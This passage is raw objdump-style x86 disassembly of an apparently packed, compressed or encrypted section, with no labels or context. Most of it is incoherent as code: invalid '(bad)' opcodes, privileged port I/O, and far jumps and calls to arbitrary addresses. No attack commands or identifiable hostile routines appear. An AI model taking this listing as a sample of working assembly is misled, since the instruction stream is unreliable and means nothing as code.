  4078fe:	outs   dx,DWORD PTR ds:[esi]
  4078ff:	daa    
  407900:	jmp    FWORD PTR [esi-0x4fa4e34f]
  407906:	or     BYTE PTR [edi+0x0],0x34
  40790a:	shr    DWORD PTR [edi],0x81
  40790d:	lods   eax,DWORD PTR ds:[esi]
  40790e:	xor    al,BYTE PTR [ecx-0x1]
  407911:	mov    ?,WORD PTR [edi-0x3eff8e2a]
  407917:	in     al,0xfe
  407919:	push   eax
  40791a:	dec    edi
  40791b:	push   esi
  40791c:	add    DWORD PTR [eax],eax
  40791e:	push   edi
  40791f:	hlt    
  407920:	pop    ss
  407921:	(bad)  
  407922:	push   edi
  407923:	pop    esp
  407924:	leave  
  407925:	ret    
  407926:	call   0x54:0x7283ebd1
  40792d:	je     0x40797f
  40792f:	fnstcw WORD PTR [eax+edx*1+0x57]
  407933:	push   eax
  407934:	sbb    edi,edi
  407936:	cli    
  407937:	das    
  407938:	(bad)  
  407939:	jne    0x40796a
  40793b:	hlt    
  40793c:	(bad)  
  40793e:	jo     0x407924
  407940:	(bad)  
  407941:	jne    0x40794a
  407943:	in     eax,0x74
  407945:	or     al,0x60
  407947:	push   0x8
  407949:	call   0x3f8666
  40794e:	pop    esi
  40794f:	sbb    DWORD PTR [eax],edx
  407951:	add    dl,cl
  407953:	shr    bl,1
  407955:	add    DWORD PTR [eax],0x0
	...
  407980:	ret    0x53
  407983:	je     0x407998
  407985:	fnstcw WORD PTR [esp+ecx*1-0x29]
  407989:	dec    edi
  40798a:	push   ss
  40798b:	jmp    FWORD PTR [edx+0x4c]
  40798e:	(bad)  
  40798f:	jne    0x407960
  407991:	repz mov dl,0xd6
  407994:	lock in al,0xfe
  407997:	jne    0x40797c
  407999:	in     al,0x74
  40799b:	or     bh,bh
  40799d:	dec    ebp
  40799e:	xlat   BYTE PTR ds:[ebx]
  40799f:	inc    DWORD PTR [eax-0x58f33df2]
  4079a5:	mov    cl,BYTE PTR [ebx-0xfffeb14]
  4079ab:	jmp    FWORD PTR [edx+0x53]
  4079ae:	call   0xff24f9f8
  4079b3:	mov    DWORD PTR [edx+0x53],ebx
  4079b6:	cmp    DWORD PTR [ebp+0x3e],0x36
  4079ba:	add    esi,DWORD PTR [eax+ebp*8-0x30]
  4079be:	(bad)  
  4079c0:	data16 cmp BYTE PTR [ecx-0x3cb38e01],0x74
  4079c8:	cld    
  4079c9:	mov    dh,0x40
  4079cb:	lock push cs
  4079cd:	mov    cl,0x10
  4079cf:	or     al,0x66
  4079d1:	sub    DWORD PTR [edx-0x3cb3ae01],edi
  4079d7:	je     0x4079e5
  4079d9:	mov    bl,0x18
  4079db:	cld    
  4079dc:	ds xor dh,bl
  4079df:	jmp    FWORD PTR [esp+edx*2+0x759b]
	...
  407a0e:	xor    bh,BYTE PTR [esi+0x10]
  407a11:	clc    
  407a12:	push   ss
  407a13:	mov    ah,BYTE PTR [ebp-0x3cc5de01]
  407a19:	jne    0x407a4a
  407a1b:	jne    0x407a2d
  407a1d:	adc    BYTE PTR [ecx],dl
  407a1f:	call   0x6cd479ba
  407a24:	call   0xf9ff:0x4a5c3675
  407a2b:	push   ebp
  407a2c:	mov    BYTE PTR [ebp-0x12],al
  407a2f:	in     al,0xaa
  407a31:	(bad)  
  407a32:	or     DWORD PTR [esi-0x67],eax
  407a35:	jmp    FWORD PTR [ebx+0x20]
  407a38:	stos   DWORD PTR es:[edi],eax
  407a39:	xchg   bh,dh
  407a3b:	xor    eax,0x30fcc999
  407a40:	add    edx,DWORD PTR [ebp-0x4b]
  407a43:	sbb    BYTE PTR [ebp+0xf0dcec4],al
  407a49:	or     al,0xa6
  407a4b:	loopne 0x407a06
  407a4d:	push   DWORD PTR [ecx-0x42f3c035]
  407a53:	xchg   DWORD PTR [eax],ecx
  407a55:	add    BYTE PTR [edx],ch
  407a57:	jne    0x4079f2
  407a59:	jne    0x407aa5
  407a5b:	pop    ebx
  407a5c:	xchg   ecx,eax
  407a5d:	inc    esp
  407a5e:	jo     0x407a9e
  407a60:	sahf   
  407a61:	or     eax,0x86dac77e
  407a66:	sti    
  407a67:	dec    edx
  407a68:	cmp    DWORD PTR [ecx-0x6e6eb10d],ebx
  407a6e:	nop
  407a6f:	ds jle 0x407a7f
	...
  407a9a:	add    BYTE PTR [eax],al
  407a9c:	jle    0x407a65
  407a9e:	retf   0xe382
  407aa1:	ds jmp 0xda9ba8aa
  407aa7:	repnz push eax
  407aa9:	enter  0x98f9,0xd3
  407aad:	ds push esi
  407aaf:	cmovbe edi,DWORD PTR [esi]
  407ab2:	aam    0xb
  407ab4:	xor    BYTE PTR es:[edi-0x67],al
  407ab8:	xor    eax,edx
  407aba:	mov    ds:0xcd338e93,eax
  407abf:	mov    eax,0xf2e3e21
  407ac4:	dec    edx
  407ac5:	xor    ecx,ebp
  407ac7:	mov    edx,0xc6303e11
  407acc:	cmp    bl,BYTE PTR [ebx-0x44]
  407acf:	mov    WORD PTR [edx],ss
  407ad1:	fisub  DWORD PTR [esp+edx*4]
  407ad4:	lea    esi,[edx+0x22]
  407ad7:	cdq    
  407ad8:	imul   edx,DWORD PTR [ebx+0x11],0x29
  407adc:	or     BYTE PTR [esi],bh
  407ade:	test   BYTE PTR [edx+0x176a537b],0x46
  407ae5:	pop    ebx
  407ae6:	pop    ebp
  407ae7:	inc    edx
  407ae8:	rol    edi,1
  407aea:	icebp  
  407aeb:	stos   DWORD PTR es:[edi],eax
  407aec:	in     eax,0x1f
  407aee:	(bad)  
  407aef:	cwde   
  407af0:	xor    eax,0xcad6551b
  407af5:	xchg   edi,eax
  407af6:	mov    ecx,0xf1c7b133
  407afb:	stos   DWORD PTR es:[edi],eax
  407afc:	int3   
  407afd:	sbb    al,0x0
  407aff:	mov    dh,0x0
	...
  407b29:	add    dh,al
  407b2b:	push   ecx
  407b2c:	shl    BYTE PTR ds:0xa57cdaa0,0x3d
  407b33:	pop    ebx
  407b34:	adc    cl,ch
  407b36:	xor    ch,BYTE PTR [ebx-0x1]
  407b39:	sbb    al,0xa6
  407b3b:	cmp    eax,0x77a59175
  407b40:	loop   0x407ac8
  407b42:	(bad)  
  407b43:	push   ecx
  407b44:	shl    ch,0x3c
  407b47:	call   0xe9e8:0xaaca2c8d
  407b4e:	xchg   esi,eax
  407b4f:	cmp    eax,0x534066ff
  407b54:	call   0xff7e0082
  407b59:	bound  edi,QWORD PTR [edx-0x5f]
  407b5c:	leave  
  407b5d:	sub    edi,DWORD PTR [ecx]
  407b5f:	cmp    eax,0xdad97254
  407b64:	ret    
  407b65:	jne    0x407b2e
  407b67:	cmp    al,0xff
  407b69:	mov    al,cs:0xb62efe03
  407b6f:	pop    ebx
  407b70:	add    cl,ch
  407b72:	cmp    eax,0x3aed44d0
  407b77:	sbb    esi,DWORD PTR [esp+ebp*8-0x43]
  407b7b:	add    DWORD PTR [eax],0xffffff94
  407b7e:	clc    
  407b7f:	xor    edi,DWORD PTR [eax-0x18]
  407b82:	cmp    eax,0x4174ff5b
  407b87:	xor    ebx,ebp
  407b89:	or     al,dh
  407b8b:	cmp    al,0xb
  407b8d:	sub    DWORD PTR [eax],eax
	...
  407bb7:	add    BYTE PTR [eax+0x4c],cl
  407bba:	push   0x9a79dc
  407bbf:	fisubr WORD PTR [edi]
  407bc1:	dec    edi
  407bc2:	call   0xff7d05b9
  407bc7:	ret    0xb347
  407bca:	cli    
  407bcb:	add    BYTE PTR [eax-0x6a],ch
  407bce:	add    bh,bh
  407bd0:	jb     0x407c25
  407bd2:	call   0xff2546e3
  407bd7:	mov    DWORD PTR [edx],esp
  407bd9:	lahf   
  407bda:	(bad)  
  407bdb:	(bad)  
  407bdc:	fsubr  DWORD PTR [edi+0x3e]
  407bdf:	add    DWORD PTR [edi-0x2a7a72a8],edx
  407be5:	in     eax,0xfe
  407be7:	push   DWORD PTR [edi]
  407be9:	out    dx,eax
  407bea:	sbb    eax,0xffffffb8
  407bed:	in     al,0x8c
  407bef:	test   DWORD PTR [ebp+0x47fffee5],edx
  407bf5:	in     al,0xb4
  407bf7:	mov    eax,0xe8fee3e9
  407bfc:	mov    cl,0x18
  407bfe:	add    BYTE PTR [eax],al
  407c00:	into   
  407c01:	fnstcw WORD PTR [ebx+0x3fe3e8fe]
  407c07:	bt     DWORD PTR [ecx+0x0],eax
  407c0b:	add    BYTE PTR [edi],ah
  407c0d:	rcl    DWORD PTR [edx+eax*8-0x8011b97],cl
  407c14:	adc    eax,0x27ffff48
  407c19:	push   ebp
  407c1a:	test   BYTE PTR [ebx+0x0],al
	...
  407c44:	add    BYTE PTR [eax],al
  407c46:	daa    
  407c47:	pop    eax
  407c48:	add    BYTE PTR [ebp+0x684f33d5],cl
  407c4e:	daa    
  407c4f:	xchg   esp,eax
  407c50:	inc    ecx
  407c51:	add    BYTE PTR [edi],bh
  407c53:	aam    0xc2
  407c55:	add    bh,ah
  407c57:	push   eax
  407c58:	shl    BYTE PTR [ebp-0x1e],0xee
  407c5c:	retf   
  407c5d:	add    bh,dl
  407c5f:	push   edi
  407c60:	lea    edx,[ebp-0x11adb]
  407c66:	dec    edx
  407c67:	call   0x414e:0xe96f502c
  407c6e:	xor    ch,BYTE PTR ds:[ebx+0x3317d72]
  407c75:	or     edi,DWORD PTR [esi+0x7e]
  407c78:	add    ecx,ebp
  407c7a:	fnstenv [ecx]
  407c7c:	add    eax,DWORD PTR [eax]
  407c7e:	mov    eax,ds:0x57e8087e
  407c83:	adc    DWORD PTR [esi+0xff245ff],edx
  407c89:	movhps xmm4,QWORD PTR [ebx-0x1ac1beb5]
  407c90:	(bad)  
  407c92:	fs mov bx,0x71ff
  407c97:	call   0xbd7ee6a4
  407c9c:	adc    BYTE PTR [esi+edx*2],cl
  407c9f:	pop    eax
  407ca0:	mov    ebx,0x709e59ff
  407ca5:	ret    0xb450
  407ca8:	xchg   esi,eax
  407ca9:	lea    eax,[eax]
	...
  407cd3:	add    ah,ch
  407cd5:	dec    ebp
  407cd6:	xor    dl,BYTE PTR [eax+0x56]
  407cd9:	aam    0xb9
  407cdb:	(bad)  
  407cdc:	cmp    ebp,esi
  407cde:	xchg   ebp,eax
  407cdf:	jne    0x407d37
  407ce1:	mov    eax,ds:0xf0291410
  407ce6:	repnz dec edi
  407ce8:	and    eax,edi
  407cea:	or     ch,al
  407cec:	push   cs
  407ced:	mov    edx,DWORD PTR [esi-0x5156d901]
  407cf3:	dec    DWORD PTR [ecx]
  407cf5:	dec    esi
  407cf6:	and    ecx,DWORD PTR [ebp-0x7a73df84]
  407cfc:	mov    dl,0x6a
  407cfe:	xchg   esi,eax
  407cff:	(bad)  
  407d00:	mov    ebp,0x72fff2df
  407d05:	inc    esi
  407d06:	stos   BYTE PTR es:[edi],al
  407d07:	adc    ah,cl
  407d09:	mov    bh,0xf3
  407d0b:	(bad)  
  407d0c:	xchg   ebx,eax
  407d0d:	jo     0x407ca4
  407d0f:	call   ecx
  407d11:	pop    ebx
  407d12:	ror    DWORD PTR [ebp+0x8e95bfd],1
  407d18:	(bad)  
  407d19:	scas   eax,DWORD PTR es:[edi]
  407d1a:	adc    al,0x2c
  407d1c:	out    dx,eax
  407d1d:	mov    ds:0xb0b10428,eax
  407d22:	cmc    
  407d23:	stos   DWORD PTR es:[edi],eax
  407d24:	dec    edi
  407d25:	push   ss
  407d26:	mov    esi,0x7cf0a195
  407d2b:	xchg   esi,eax
  407d2c:	cdq    
  407d2d:	cmp    bl,BYTE PTR [ecx]
  407d2f:	lods   al,BYTE PTR ds:[esi]
  407d30:	not    DWORD PTR ds:0xddee95a6
  407d36:	sbb    edi,esp
	...
  407d60:	add    BYTE PTR [eax],al
  407d62:	sub    DWORD PTR [esi+0x4ef394e5],0x62eb9539
  407d6c:	xchg   BYTE PTR [edi],ch
  407d6e:	inc    esi
  407d6f:	inc    esi
  407d70:	in     eax,dx
  407d71:	xchg   esp,eax
  407d72:	jmp    0x407dc2
  407d74:	sbb    DWORD PTR [ebp+0x308162d3],edx
  407d7a:	push   ebx
  407d7b:	cmp    ah,BYTE PTR [esi-0x54]
  407d7e:	cld    
  407d7f:	adc    DWORD PTR [esi-0x6b],ebx
  407d82:	mov    bl,0xe0
  407d84:	sub    dl,BYTE PTR [esi-0x6b46c5c7]
  407d8a:	jmp    0x407d82
  407d8c:	inc    esi
  407d8d:	xchg   ebp,eax
  407d8e:	sub    DWORD PTR [ebx-0x71],eax
  407d91:	ret    0x5b3e
  407d94:	ins    BYTE PTR es:[edi],dx
  407d95:	les    ecx,FWORD PTR [ecx-0x20]
  407d98:	aaa    
  407d99:	xchg   esi,eax
  407d9a:	adc    DWORD PTR [edx],edi
  407d9c:	es dec edi
  407d9e:	retf   0x1e38
  407da1:	xchg   ebp,eax
  407da2:	push   ss
  407da3:	cld    
  407da4:	sub    al,BYTE PTR [esi+edi*1]
  407da7:	cmp    dl,BYTE PTR [esp+ebx*2-0x10]
  407dab:	cmp    DWORD PTR [esi],eax
  407dad:	lods   al,BYTE PTR ds:[esi]
  407dae:	dec    esp
  407daf:	adc    bh,dh
  407db1:	xchg   esp,eax
  407db2:	neg    DWORD PTR [eax+eax*1]
  407db5:	fnstsw WORD PTR ds:0x27fd8b90
  407dbb:	pop    ebx
  407dbc:	call   FWORD PTR [esi+ecx*8+0x38]
  407dc0:	jne    0x407dbb
  407dc2:	stos   BYTE PTR es:[edi],al
  407dc3:	scas   eax,DWORD PTR es:[edi]
  407dc4:	or     al,0xd6
	...
  407dee:	add    BYTE PTR [eax],al
  407df0:	dec    eax
  407df1:	arpl   ax,bp
  407df3:	push   cs
  407df4:	enter  0xff39,0xb0
  407df8:	jg     0x407e44
  407dfa:	add    BYTE PTR [edi+esi*4],dl
  407dfd:	inc    esi
  407dfe:	(bad)  
  407dff:	cmp    al,0x46
  407e01:	inc    ebx
  407e02:	inc    ecx
  407e03:	xchg   edx,eax
  407e04:	stos   BYTE PTR es:[edi],al
  407e05:	cmp    DWORD PTR [ebx],ecx
  407e07:	test   eax,0x14ff5939
  407e0c:	mov    ch,BYTE PTR [ecx+0x39b7a6e8]
  407e12:	(bad)  
  407e13:	cmp    ebx,ecx
  407e15:	scas   eax,DWORD PTR es:[edi]
  407e16:	sbb    BYTE PTR [esi+0x7e504f38],al
  407e1c:	xor    BYTE PTR [ebx-0x18],ah
  407e1f:	aaa    
  407e20:	mov    dl,0x39
  407e22:	inc    DWORD PTR [ecx+0x66ff1092]
  407e28:	je     0x407e46
  407e2a:	adc    al,0xe9
  407e2c:	adc    dh,ah
  407e2e:	jmp    0x407e86
  407e30:	dec    eax
  407e31:	dec    edi
  407e32:	call   esp
  407e34:	sub    eax,0x57f5753a
  407e39:	push   ebp
  407e3a:	push   DWORD PTR [ebp+esi*1-0x4dc946bd]
  407e41:	cmp    bh,bh
  407e43:	mov    ah,0x21
  407e45:	cmp    dh,BYTE PTR [ebp-0x7]
  407e48:	mov    dl,0xae
  407e4a:	or     al,0x93
  407e4c:	push   ds
  407e4d:	cmp    dh,BYTE PTR [ebp-0x1f]
  407e50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e51:	add    edi,edi
  407e53:	push   cs
	...
  407e7c:	add    BYTE PTR [eax],al
  407e7e:	retf   0x7538
  407e81:	add    BYTE PTR [ebx],cl
  407e83:	shl    BYTE PTR [eax+edx*1-0x20],1
  407e87:	data16 or al,0x6a
  407e8a:	repz iret 
  407e8c:	je     0x407e96
  407e8e:	aas    
  407e8f:	stos   DWORD PTR es:[edi],eax
  407e90:	(bad)  
  407e91:	jmp    eax
  407e93:	test   cl,0x10
  407e96:	xlat   BYTE PTR ds:[ebx]
  407e97:	jae    0x407e24
  407e99:	in     al,dx
  407e9a:	and    al,0x23
  407e9c:	lock push ebx
  407e9e:	imul   esi,DWORD PTR [ebx+ebp*1-0x25],0xff0ca22c
  407ea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ea7:	fld    QWORD PTR [eax+edi*8-0x30]
  407eab:	push   edx
  407eac:	or     BYTE PTR [edi+0x45c6cb5a],cl
  407eb2:	stos   DWORD PTR es:[edi],eax
  407eb3:	pop    edi
  407eb4:	add    BYTE PTR [eax],al
  407eb6:	xchg   edi,eax
  407eb7:	loope  0x407ef5
  407eb9:	scas   eax,DWORD PTR es:[edi]
  407eba:	sbb    al,0x9e
  407ebc:	add    BYTE PTR [eax],al
  407ebe:	dec    ebx
  407ebf:	imul   eax,DWORD PTR [ebx+0x745c6f7d],0x56
  407ec6:	shl    BYTE PTR [ecx+0x5e3d50f0],cl
  407ecc:	push   0x0
  407ece:	cmp    eax,0x477d835f
  407ed3:	pop    esp
  407ed4:	je     0x407edb
  407ed6:	loopne 0x407f29
  407ed8:	adc    bl,ch
  407eda:	and    eax,0x276a0056
  407edf:	fild   DWORD PTR [eax+edi*8+0x0]
	...
  407f0b:	add    bh,al
  407f0d:	int3   
  407f0e:	adc    al,0xaf
  407f10:	in     al,dx
  407f11:	sahf   
  407f12:	add    BYTE PTR [ebx],cl
  407f14:	addr16 push ebx
  407f16:	das    
  407f17:	and    edx,0xffffffcf
  407f1a:	push   DWORD PTR [ebx-0x12]
  407f1d:	mov    eax,0x9a8c0c45
  407f22:	lock cmp edi,DWORD PTR [esi]
  407f25:	cmp    bl,BYTE PTR [edx]
  407f27:	pop    ss
  407f28:	jge    0x407f90
  407f2a:	jg     0x407fa1
  407f2c:	repnz lods al,BYTE PTR ds:[esi]
  407f2e:	adc    DWORD PTR [eax],ecx
  407f30:	mov    ch,0x6
  407f32:	xchg   ebx,eax
  407f33:	jecxz  0x407f71
  407f35:	xor    eax,0x167b8b67
  407f3a:	xchg   edx,eax
  407f3b:	jne    0x407f0b
  407f3d:	mov    al,0x3
  407f3f:	dec    DWORD PTR [ebx+0xe]
  407f42:	fwait
  407f43:	out    0x7e,al
  407f45:	inc    ecx
  407f46:	add    ecx,DWORD PTR [ebx+0x5b32887d]
  407f4c:	ja     0x407f51
  407f4e:	(bad)  
  407f4f:	dec    DWORD PTR [edx]
  407f51:	lods   eax,DWORD PTR ds:[esi]
  407f52:	lahf   
  407f53:	add    DWORD PTR [edx-0x16a9ca13],0xffffff99
  407f5a:	ds push eax
  407f5c:	inc    DWORD PTR [ecx-0x65]
  407f5f:	ins    BYTE PTR es:[edi],dx
  407f60:	jg     0x407fa3
  407f62:	add    ecx,DWORD PTR [ebx-0x3b7f76a]
  407f68:	ds inc edx
  407f6a:	add    eax,DWORD PTR [eax]
  407f6c:	xor    eax,0x3e1702
	...
  407f99:	add    dh,dl
  407f9b:	out    dx,eax
  407f9c:	xor    al,BYTE PTR [ecx+0x3e]
  407f9f:	push   ebp
  407fa0:	pushf  
  407fa1:	hlt    
  407fa2:	jle    0x407fe5
  407fa4:	add    ecx,DWORD PTR [ebx]
  407fa6:	jle    0x407fbd
  407fa8:	loop   0x407f34
  407faa:	dec    esi
  407fab:	or     DWORD PTR [edx],edi
  407fad:	push   eax
  407fae:	jg     0x407ff4
  407fb0:	ss call 0x4404d3
  407fb6:	xor    eax,0xb51e1784
  407fbb:	pushf  
  407fbc:	add    BYTE PTR [ebp+0x1a],0xd5
  407fc0:	call   0x950:0x344feec
  407fc7:	pop    esp
  407fc8:	xchg   BYTE PTR ds:[ebx+0x4417e937],al
  407fcf:	repz out 0x3,eax
  407fd2:	ds pop ebx
  407fd4:	scas   al,BYTE PTR es:[edi]
  407fd5:	xor    DWORD PTR [ebp+0x3e4b2a24],eax
  407fdb:	pop    ebx
  407fdc:	jmp    0x92d5f8e4
  407fe1:	mov    esp,0x9f6290fd
  407fe6:	mov    ebp,0x385d91f
  407feb:	ret    0x4332
  407fee:	ds pop ebx
  407ff0:	pop    ebp
  407ff1:	idiv   BYTE PTR [eax+edi*2+0x5aff3d3e]
  407ff8:	jmp    0xfc1ab714
  407ffd:	adc    al,0x0
	...
  408027:	add    BYTE PTR ds:0xb03e99c,al
  40802d:	pop    esi
  40802e:	jno    0x408033
  408030:	ds pop ebx
  408032:	jmp    0x2428fdf1
  408037:	mov    es,WORD PTR [eax-0x13616a5]
  40803d:	pop    ebx
  40803e:	jmp    0xe9997f0c
  408043:	leave  
  408044:	(bad)  
  408045:	pop    ecx
  408046:	jmp    0xe99f7f14
  40804b:	leave  
  40804c:	(bad)  
  40804d:	pop    edi
  40804e:	in     al,0x7e
  408050:	add    ebp,DWORD PTR [edi]
  408052:	mov    ecx,0xe9c13e1d
  408057:	sbb    eax,0x1de9c13e
  40805c:	ds shr ecx,0x1b
  408060:	pop    esi
  408061:	pop    ecx
  408062:	jmp    0xd3bc146a
  408067:	add    eax,0x33009fcb
  40806c:	dec    edx
  40806d:	ss adc eax,0x9c4ac2
  408073:	repnz std 
  408075:	scas   eax,DWORD PTR es:[edi]
  408076:	add    dh,BYTE PTR [eax]
  408078:	add    ebx,DWORD PTR [esi]
  40807a:	inc    ebp
  40807b:	sbb    DWORD PTR [edx],edi
  40807d:	pop    ebx
  40807e:	add    cl,ch
  408080:	push   0xce99f0a0
  408085:	scas   eax,DWORD PTR es:[edi]
  408086:	hlt    
  408087:	xchg   ebx,eax
  408088:	cmp    eax,0x861536
	...
  4080b5:	add    BYTE PTR [edx],dl
  4080b7:	pushf  
  4080b8:	add    dl,ah
  4080ba:	std    
  4080bb:	scas   eax,DWORD PTR es:[edi]
  4080bc:	pop    es
  4080bd:	scas   al,BYTE PTR es:[edi]
  4080be:	js     0x4080eb
  4080c0:	add    cl,ch
  4080c2:	cmp    eax,0xd65cff5b
  4080c7:	xor    eax,0x9c6b5a15
  4080cc:	add    BYTE PTR [edx-0x8],dh
  4080cf:	sub    cl,cl
  4080d1:	stos   BYTE PTR es:[edi],al
  4080d2:	push   eax
  4080d3:	loop   0x4080c0
  4080d5:	push   0x79
  4080d7:	loop   0x408065
  4080d9:	and    al,0xa
  4080db:	mov    ebp,DWORD PTR [eax-0x59]
  4080de:	(bad)  
  4080df:	fwait
  4080e0:	add    BYTE PTR [ecx-0x6900c6b8],dl
  4080e6:	sub    eax,0x3415c062
  4080eb:	fidivr DWORD PTR [ecx+esi*2+0x69]
  4080ef:	lods   al,BYTE PTR ds:[esi]
  4080f0:	imul   ebp,DWORD PTR [eax+eax*1+0x2b],0x50
  4080f5:	adc    DWORD PTR [eax-0x3f16ffe6],0x3ec7781a
  4080ff:	in     eax,dx
  408100:	inc    esp
  408101:	pop    esi
  408102:	ins    DWORD PTR es:[edi],dx
  408103:	fs mov dh,0xac
  408106:	iret   
  408107:	mov    ecx,DWORD PTR [edi]
  408109:	xchg   edi,eax
  40810a:	xor    BYTE PTR [esi],0x50
  40810d:	add    BYTE PTR [eax],ch
  40810f:	xchg   ebx,eax
  408110:	inc    ebp
  408111:	cld    
  408112:	mov    bh,0x5b
  408114:	mov    dh,0x45
  408116:	dec    esp
  408117:	push   0xb60f
	...
  408144:	loop   0x40812c
  408146:	dec    edi
  408147:	punpcklwd mm3,DWORD PTR [ebp-0x6d17af07]
  40814e:	inc    ebp
  40814f:	clc    
  408150:	mov    bh,0x5b
  408152:	mov    bh,0x45
  408154:	push   ecx
  408155:	push   0xcc92b70f
  40815a:	dec    edi
  40815b:	call   DWORD PTR [edx-0x38]
  40815e:	add    esi,DWORD PTR [bx+0x99]
  408163:	lea    esp,[edx-0x4617af4c]
  408169:	pop    ds
  40816a:	add    BYTE PTR [eax],al
  40816c:	and    al,0x23
  40816e:	xor    al,0x8d
  408170:	(bad)  
  408171:	fisttp DWORD PTR [edi-0x18]
  408174:	dec    ecx
  408175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408176:	add    BYTE PTR [eax],al
  408178:	inc    edi
  408179:	fiadd  DWORD PTR [esp+ecx*4+0x37]
  40817d:	push   edi
  40817e:	dec    BYTE PTR [edi+0x66]
  408181:	pop    edi
  408182:	call   0xff24f974
  408187:	call   0x3f74bf
  40818c:	scas   al,BYTE PTR es:[edi]
  40818d:	sbb    BYTE PTR [ebp-0x75],dl
  408190:	mov    ebx,0xb82cc3de
  408195:	in     al,0xfe
  408197:	push   ebx
  408198:	inc    eax
  408199:	push   ecx
  40819a:	add    BYTE PTR [edx+0x67],ch
  40819d:	in     eax,0x74
  40819f:	or     BYTE PTR [edi-0x27002f28],bh
  4081a5:	mov    ch,0x45
  4081a7:	cld    
	...
  4081d0:	add    BYTE PTR [eax],al
  4081d2:	outs   dx,DWORD PTR ds:[esi]
  4081d3:	pop    edi
  4081d4:	add    bh,ch
  4081d6:	(bad)  
  4081d8:	je     0x4081e2
  4081da:	ds call 0x9c1c:0xa529d0a0
  4081e2:	ds inc edx
  4081e4:	add    ecx,DWORD PTR [ebp-0x71de3d]
  4081ea:	adc    edx,edx
  4081ec:	call   0xbbc7:0x8f84f258
  4081f3:	loope  0x408182
  4081f5:	(bad)  
  4081f6:	stc    
  4081f7:	mov    ch,0x4
  4081f9:	add    BYTE PTR [esi],bh
  4081fb:	mov    edi,0x64e96089
  408200:	(bad)  
  408201:	push   eax
  408202:	(bad)  
  408203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408204:	dec    edi
  408205:	add    BYTE PTR [esi],bh
  408207:	or     DWORD PTR [ebx+ebp*1+0x7451beec],edi
  40820e:	leave  
  40820f:	inc    esp
  408210:	mov    gs,ebx
  408212:	sub    eax,0x32ffcec2
  408217:	aas    
  408218:	dec    ecx
  408219:	add    DWORD PTR [esi],edi
  40821b:	inc    edx
  40821c:	add    ecx,DWORD PTR [ebx]
  40821e:	mov    WORD PTR [ebp+0x4239c603],cs
  408224:	inc    esi
  408225:	inc    ecx
  408226:	mov    edi,0x3e00831a
  40822b:	inc    edx
  40822c:	adc    ebp,esp
  40822e:	xor    eax,0x16161702
  408233:	fiadd  WORD PTR [edx]
	...
  40825d:	add    BYTE PTR [eax],al
  40825f:	add    BYTE PTR [esi],bh
  408261:	(bad)  
  408262:	mov    BYTE PTR [eax+0x71],ah
  408265:	int3   
  408266:	lea    edx,[eax+0x69]
  408269:	dec    esi
  40826a:	cld    
  40826b:	out    0xa2,eax
  40826d:	ror    DWORD PTR [ebp+0x194565ff],1
  408273:	add    ah,ah
  408275:	inc    ecx
  408276:	mov    ?,WORD PTR [ebp+0x36]
  408279:	ficomp DWORD PTR [eax+edx*8+0x41]
  40827d:	pop    edx
  40827e:	data16 fwait
  408280:	or     esi,DWORD PTR [ecx]
  408282:	pop    esi
  408283:	mov    cs,WORD PTR [esi+0x21fbdc32]
  408289:	(bad)  
  40828a:	cmp    DWORD PTR [esi+0x7e9c421],ecx
  408290:	ds pop ebx
  408292:	push   ecx
  408293:	(bad)
  408296:	ss jl  0x40825c
  408299:	(bad)  
  40829a:	mov    es,WORD PTR cs:[ecx]
  40829d:	les    esp,FWORD PTR [esi]
  40829f:	add    bh,BYTE PTR [esi]
  4082a1:	pop    ebx
  4082a2:	push   ds
  4082a3:	pop    eax
  4082a4:	xchg   edx,eax
  4082a5:	xor    dl,BYTE PTR [esi]
  4082a7:	mov    ss,WORD PTR [esi+0x5d]
  4082aa:	stc    
  4082ab:	add    edi,DWORD PTR [esi]
  4082ad:	ret    
  4082ae:	jmp    0x119bc0ba
  4082b3:	call   0x3429de48
  4082b8:	leave  
  4082b9:	call   0x3302114a
  4082be:	out    0x17,al
  4082c0:	inc    esi
  4082c1:	inc    ebx
  4082c2:	inc    esi
  4082c3:	mov    ah,0x0
	...
  4082ed:	add    BYTE PTR [ecx+0x3d8d4132],dh
  4082f3:	pop    ebx
  4082f4:	jmp    0xc6d06e85
  4082f9:	lea    ebx,[ecx-0x6e0c173d]
  4082ff:	xor    al,BYTE PTR [ecx+0x4]
  408302:	inc    edx
  408303:	pop    ebx
  408304:	jmp    0xe93205a4
  408309:	add    ecx,DWORD PTR [esi]
  40830b:	xor    dl,BYTE PTR [eax+esi*1+0x71]
  40830f:	xor    dl,BYTE PTR [esi-0x7e9d0c73]
  408315:	into   
  408316:	jno    0x40834a
  408318:	xchg   BYTE PTR [ebx+eax*4-0x117281d0],bl
  40831f:	xor    DWORD PTR [eax],eax
  408321:	cld    
  408322:	inc    ebp
  408323:	cmp    bh,dl
  408325:	sahf   
  408326:	mov    bl,0x32
  408328:	call   0xff724ee5
  40832d:	ins    BYTE PTR es:[edi],dx
  40832e:	mov    ecx,0xbb56ff92
  408333:	mov    ch,BYTE PTR [eax+0x4f]
  408336:	arpl   WORD PTR [eax+eax*1-0xc532af],bx
  40833d:	ds xchg ebp,eax
  40833f:	fcom   DWORD PTR [ebx+0x36]
  408342:	mov    ebx,0x466c8331
  408347:	xor    bh,bh
  408349:	es inc edx
  40834b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40834c:	inc    ebp
  40834d:	push   0xffffff81
  40834f:	xchg   ebx,eax
  408350:	call   DWORD PTR [esi]
	...
  40837a:	add    BYTE PTR [eax],al
  40837c:	mov    ebx,0xbecd7246
  408381:	xlat   BYTE PTR ds:[ebx]
  408382:	push   edi
  408383:	push   es
  408384:	retf   
  408385:	xor    DWORD PTR [esi+edi*8],eax
  408388:	push   0xbaf6ff93
  40838d:	xor    DWORD PTR [ebp-0x1f],esi
  408390:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408391:	jmp    0xde0b6a64
  408396:	lods   al,BYTE PTR ds:[esi]
  408397:	inc    ecx
  408398:	ret    
  408399:	xor    edi,edi
  40839b:	in     eax,dx
  40839c:	inc    edi
  40839d:	xor    bh,bh
  40839f:	push   esp
  4083a0:	mov    ds:0xcab6a639,al
  4083a5:	xor    edi,edi
  4083a7:	je     0x40840e
  4083a9:	xor    bh,bh
  4083ab:	mov    dh,0xba
  4083ad:	out    0x53,eax
  4083af:	scas   al,BYTE PTR es:[edi]
  4083b0:	mov    dl,0x31
